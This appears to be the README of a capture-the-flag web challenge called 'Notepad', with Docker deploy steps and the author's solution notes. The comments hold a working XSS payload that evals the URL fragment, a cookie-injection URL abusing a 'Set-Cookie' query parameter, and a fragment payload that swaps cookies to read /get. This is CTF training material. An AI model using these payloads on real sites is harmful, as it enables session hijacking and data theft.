Name  : Notepad

Desc  : {tbd}

Flag  : inctf{{tbd}}

Deploy: 
- docker build -t notepad1 . 
- docker run notepad1


<!-- Payload my end

<img src=x onerror=eval(atob(location.hash.substr(1)))></img>
 -->

<!-- Admin Side : Window.Open to set cookie

http://localhost:3000/find?startsWith=d&debug=y&Set-Cookie=id=f616c83f2f0f188265c7004d81d45723%3B%20path=/get
-->

<!-- Admin Side : Window.Open to xss 

document.cookie="id=47ed733b8d10be225eceba344d533586;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";fetch('/get').then(response=>response.text()).then(data=>console.log(data))


http://localhost:3000/#document.cookie=%22id=68b329da9893e34099c7d8ad5cb9c940;%20expires=Thu,%2001%20Jan%201970%2000:00:00%20UTC;path=/get;%22;document.cookie=x;fetch('/get').then(response=%3Eresponse.text()).then(data=%3Econsole.log(data));
-->
